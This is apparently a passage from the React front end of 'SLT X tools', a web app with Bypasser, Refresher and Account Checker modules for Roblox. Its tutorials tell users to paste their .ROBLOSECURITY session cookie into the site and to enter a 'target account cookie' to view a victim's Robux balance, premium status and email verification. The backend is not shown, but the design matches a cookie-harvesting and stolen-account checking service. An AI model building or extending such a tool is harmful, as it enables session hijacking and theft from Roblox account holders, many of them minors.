                  {checkerResponse.result?.status === 'success' ? <CheckCircle2 size={24} /> : <XCircle size={24} />}
                </div>
                <div className="flex-1">
                  <h4 className="font-bold text-lg mb-1 text-white">
                    {checkerResponse.result?.status === 'success' ? 'Scan Successful!' : 'Scan Failed!'}
                  </h4>
                  <p className="text-sm text-gray-400 leading-relaxed">
                    {checkerResponse.result?.message || checkerResponse.message || (checkerResponse.error ? checkerResponse.error : (checkerResponse.result?.status === 'success' ? 'Account details retrieved successfully.' : 'An unknown error occurred.'))}
                  </p>
                </div>
              </div>
              
              {checkerResponse.result?.status === 'success' && checkerResponse.result.user_info && (
                <div className="mt-4 bg-[#0a0a0a] border border-[#1f1f1f] rounded-2xl overflow-hidden">
                  <div className="p-4 border-b border-[#1f1f1f] flex items-center gap-4">
                    {checkerResponse.result.user_info.avatar_url && (
                      <img src={checkerResponse.result.user_info.avatar_url} alt="Avatar" className="w-16 h-16 rounded-full border border-[#1f1f1f]" referrerPolicy="no-referrer" />
                    )}
                    <div>
                      <h5 className="text-white font-bold text-lg leading-tight">{checkerResponse.result.user_info.display_name || checkerResponse.result.user_info.username}</h5>
                      <p className="text-xs text-gray-400 font-medium">@{checkerResponse.result.user_info.username}</p>
                      <p className="text-[10px] text-gray-500 mt-0.5">ID: {checkerResponse.result.user_info.user_id}</p>
                    </div>
                  </div>
                  <div className="p-4 grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider font-bold mb-1">Robux</p>
                      <p className="text-white font-mono">{checkerResponse.result.account_status?.robux_balance || 0}</p>
                    </div>
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider font-bold mb-1">Account Age</p>
                      <p className="text-white font-mono">{checkerResponse.result.user_info.account_age_days} days</p>
                    </div>
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider font-bold mb-1">Premium</p>
                      <p className="text-white font-mono">{checkerResponse.result.account_status?.premium}</p>
                    </div>
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider font-bold mb-1">Email Verified</p>
                      <p className="text-white font-mono">{checkerResponse.result.account_status?.email_verified}</p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function Tutorials() {
  const [expandedTutorial, setExpandedTutorial] = useState<string | null>(null);

  const toggleTutorial = (id: string) => {
    if (expandedTutorial === id) {
      setExpandedTutorial(null);
    } else {
      setExpandedTutorial(id);
    }
  };

  return (
    <div className="max-w-3xl mx-auto">
      <header className="mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-2">How to use SLT X tools</h1>
        <p className="text-gray-400 text-sm">Step-by-step guides for every tool in the suite. Click a card to expand the tutorial.</p>
      </header>

      <div className="space-y-4">
        <TutorialCard
          id="bypasser"
          icon={<ShieldCheck size={20} className="text-blue-400" />}
          title="Bypasser Module"
          subtitle="How to submit your Roblox cookie for bypassing"
          colorClass="bg-[#0f172a] border-blue-900/30"
          iconBgClass="bg-blue-900/20"
          isExpanded={expandedTutorial === 'bypasser'}
          onClick={() => toggleTutorial('bypasser')}
        >
          <p className="text-sm text-gray-300">1. Get your Roblox cookie (.ROBLOSECURITY).<br/>2. Paste it into the Bypasser input field.<br/>3. Click "Execute Bypass".</p>
        </TutorialCard>

        <TutorialCard
          id="refresher"
          icon={<RefreshCw size={20} className="text-green-400" />}
          title="Refresher Suite"
          subtitle="How to refresh a Roblox cookie"
          colorClass="bg-[#052e16] border-green-900/30"
          iconBgClass="bg-green-900/20"
          isExpanded={expandedTutorial === 'refresher'}
          onClick={() => toggleTutorial('refresher')}
        >
          <p className="text-sm text-gray-300">1. Paste your valid Roblox cookie.<br/>2. Click "Execute Refresh".<br/>3. Copy the new cookie provided.</p>
        </TutorialCard>

        <TutorialCard
          id="checker"
          icon={<UserSearch size={20} className="text-purple-400" />}
          title="Account Checker"
          subtitle="How to check Roblox account details"
          colorClass="bg-[#2e1065] border-purple-900/30"
          iconBgClass="bg-purple-900/20"
          isExpanded={expandedTutorial === 'checker'}
          onClick={() => toggleTutorial('checker')}
        >
          <p className="text-sm text-gray-300">1. Enter the target account cookie.<br/>2. Click "Execute Scan".<br/>3. View the account details in the results panel.</p>
        </TutorialCard>
      </div>
    </div>
  );
}

export default function App() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [isMobile, setIsMobile] = useState(false);
  const [backendStats, setBackendStats] = useState({
    totalBypasses: 0,
    totalChecks: 0,
    totalRefreshes: 0,
    lastRefreshTime: null as string | null
  });

  useEffect(() => {
    const fetchStats = async () => {
      try {
        const res = await fetch('/api/stats');
        if (res.ok) {
          const data = await res.json();
          setBackendStats(data);
        }
      } catch (error) {
        console.error("Failed to fetch stats:", error);
      }
    };

    fetchStats();
    const interval = setInterval(fetchStats, 30000); // Refresh stats every 30s
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const handleResize = () => {
      const mobile = window.innerWidth < 768;
      setIsMobile(mobile);
      if (mobile) {
        setSidebarOpen(false);
      } else {
        setSidebarOpen(true);
      }
    };
    
    handleResize();
    window.addEventListener('resize', handleResize);
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []);

  return (
    <BrowserRouter>
      <Layout 
        sidebarOpen={sidebarOpen} 
        setSidebarOpen={setSidebarOpen} 
        isMobile={isMobile} 
      >
        <Routes>
          <Route path="/" element={<Dashboard backendStats={backendStats} />} />
          <Route path="/bypass" element={<Bypasser setBackendStats={setBackendStats} />} />
          <Route path="/refresh" element={<Refresher setBackendStats={setBackendStats} />} />
          <Route path="/checker" element={<AccountChecker setBackendStats={setBackendStats} />} />
          <Route path="/tutorials" element={<Tutorials />} />
          <Route path="/admin" element={
            <div className="flex flex-col items-center justify-center h-64 text-gray-400">
              <p className="text-lg font-medium mb-2">Admin Panel Module</p>
              <p className="text-sm">This section is currently under development.</p>
            </div>
          } />
          <Route path="*" element={<Navigate to="/" replace />} />
        </Routes>
      </Layout>
    </BrowserRouter>
  );
}
